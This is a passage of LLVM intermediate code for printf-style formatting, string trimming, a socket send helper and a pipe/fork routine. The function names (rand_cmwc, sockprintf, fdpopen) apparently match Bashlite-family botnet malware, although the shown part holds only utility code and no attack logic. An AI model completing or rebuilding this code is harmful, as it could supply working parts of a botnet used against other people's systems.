  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #14
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %151, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %151 ]
  %.0 = phi i8* [ %1, %3 ], [ %152, %151 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %147 [
    i8 0, label %153
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %153
    i8 37, label %147
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %151 [
    i8 115, label %48
    i8 100, label %66
    i8 120, label %82
    i8 88, label %98
    i8 117, label %114
    i8 99, label %130
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i8**
  %61 = load i8*, i8** %60, align 8
  %62 = icmp ne i8* %61, null
  %63 = select i1 %62, i8* %61, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.117, i64 0, i64 0)
  %64 = tail call fastcc i32 @prints(i8** %0, i8* %63, i32 %.064.lcssa, i32 %.063.lcssa)
  %65 = add nsw i32 %64, %.061
  br label %151

; <label>:66:                                     ; preds = %.critedge
  %67 = load i32, i32* %8, align 8
  %68 = icmp ult i32 %67, 41
  br i1 %68, label %69, label %74

; <label>:69:                                     ; preds = %66
  %70 = load i8*, i8** %9, align 8
  %71 = sext i32 %67 to i64
  %72 = getelementptr i8, i8* %70, i64 %71
  %73 = add i32 %67, 8
  store i32 %73, i32* %8, align 8
  br label %77

; <label>:74:                                     ; preds = %66
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr i8, i8* %75, i64 8
  store i8* %76, i8** %10, align 8
  br label %77

; <label>:77:                                     ; preds = %74, %69
  %.in68 = phi i8* [ %72, %69 ], [ %75, %74 ]
  %78 = bitcast i8* %.in68 to i32*
  %79 = load i32, i32* %78, align 4
  %80 = tail call fastcc i32 @printi(i8** %0, i32 %79, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %81 = add nsw i32 %80, %.061
  br label %151

; <label>:82:                                     ; preds = %.critedge
  %83 = load i32, i32* %11, align 8
  %84 = icmp ult i32 %83, 41
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %82
  %86 = load i8*, i8** %12, align 8
  %87 = sext i32 %83 to i64
  %88 = getelementptr i8, i8* %86, i64 %87
  %89 = add i32 %83, 8
  store i32 %89, i32* %11, align 8
  br label %93

; <label>:90:                                     ; preds = %82
  %91 = load i8*, i8** %13, align 8
  %92 = getelementptr i8, i8* %91, i64 8
  store i8* %92, i8** %13, align 8
  br label %93

; <label>:93:                                     ; preds = %90, %85
  %.in67 = phi i8* [ %88, %85 ], [ %91, %90 ]
  %94 = bitcast i8* %.in67 to i32*
  %95 = load i32, i32* %94, align 4
  %96 = tail call fastcc i32 @printi(i8** %0, i32 %95, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %97 = add nsw i32 %96, %.061
  br label %151

; <label>:98:                                     ; preds = %.critedge
  %99 = load i32, i32* %14, align 8
  %100 = icmp ult i32 %99, 41
  br i1 %100, label %101, label %106

; <label>:101:                                    ; preds = %98
  %102 = load i8*, i8** %15, align 8
  %103 = sext i32 %99 to i64
  %104 = getelementptr i8, i8* %102, i64 %103
  %105 = add i32 %99, 8
  store i32 %105, i32* %14, align 8
  br label %109

; <label>:106:                                    ; preds = %98
  %107 = load i8*, i8** %16, align 8
  %108 = getelementptr i8, i8* %107, i64 8
  store i8* %108, i8** %16, align 8
  br label %109

; <label>:109:                                    ; preds = %106, %101
  %.in66 = phi i8* [ %104, %101 ], [ %107, %106 ]
  %110 = bitcast i8* %.in66 to i32*
  %111 = load i32, i32* %110, align 4
  %112 = tail call fastcc i32 @printi(i8** %0, i32 %111, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %113 = add nsw i32 %112, %.061
  br label %151

; <label>:114:                                    ; preds = %.critedge
  %115 = load i32, i32* %17, align 8
  %116 = icmp ult i32 %115, 41
  br i1 %116, label %117, label %122

; <label>:117:                                    ; preds = %114
  %118 = load i8*, i8** %18, align 8
  %119 = sext i32 %115 to i64
  %120 = getelementptr i8, i8* %118, i64 %119
  %121 = add i32 %115, 8
  store i32 %121, i32* %17, align 8
  br label %125

; <label>:122:                                    ; preds = %114
  %123 = load i8*, i8** %19, align 8
  %124 = getelementptr i8, i8* %123, i64 8
  store i8* %124, i8** %19, align 8
  br label %125

; <label>:125:                                    ; preds = %122, %117
  %.in65 = phi i8* [ %120, %117 ], [ %123, %122 ]
  %126 = bitcast i8* %.in65 to i32*
  %127 = load i32, i32* %126, align 4
  %128 = tail call fastcc i32 @printi(i8** %0, i32 %127, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %129 = add nsw i32 %128, %.061
  br label %151

; <label>:130:                                    ; preds = %.critedge
  %131 = load i32, i32* %20, align 8
  %132 = icmp ult i32 %131, 41
  br i1 %132, label %133, label %138

; <label>:133:                                    ; preds = %130
  %134 = load i8*, i8** %21, align 8
  %135 = sext i32 %131 to i64
  %136 = getelementptr i8, i8* %134, i64 %135
  %137 = add i32 %131, 8
  store i32 %137, i32* %20, align 8
  br label %141

; <label>:138:                                    ; preds = %130
  %139 = load i8*, i8** %24, align 8
  %140 = getelementptr i8, i8* %139, i64 8
  store i8* %140, i8** %24, align 8
  br label %141

; <label>:141:                                    ; preds = %138, %133
  %.in = phi i8* [ %136, %133 ], [ %139, %138 ]
  %142 = bitcast i8* %.in to i32*
  %143 = load i32, i32* %142, align 4
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %145 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %146 = add nsw i32 %145, %.061
  br label %151

; <label>:147:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %148 = load i8, i8* %.3, align 1
  %149 = zext i8 %148 to i32
  tail call fastcc void @printchar(i8** %0, i32 %149)
  %150 = add nsw i32 %.061, 1
  br label %151

; <label>:151:                                    ; preds = %.critedge, %147, %141, %125, %109, %93, %77, %59
  %.162 = phi i32 [ %150, %147 ], [ %65, %59 ], [ %81, %77 ], [ %97, %93 ], [ %113, %109 ], [ %129, %125 ], [ %146, %141 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %147 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %77 ], [ %.2.lcssa, %93 ], [ %.2.lcssa, %109 ], [ %.2.lcssa, %125 ], [ %.2.lcssa, %141 ], [ %.2.lcssa, %.critedge ]
  %152 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:153:                                    ; preds = %27, %25
  %154 = icmp eq i8** %0, null
  br i1 %154, label %157, label %155

; <label>:155:                                    ; preds = %153
  %156 = load i8*, i8** %0, align 8
  store i8 0, i8* %156, align 1
  br label %157

; <label>:157:                                    ; preds = %153, %155
  %158 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %158)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #14
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #3
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #3
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
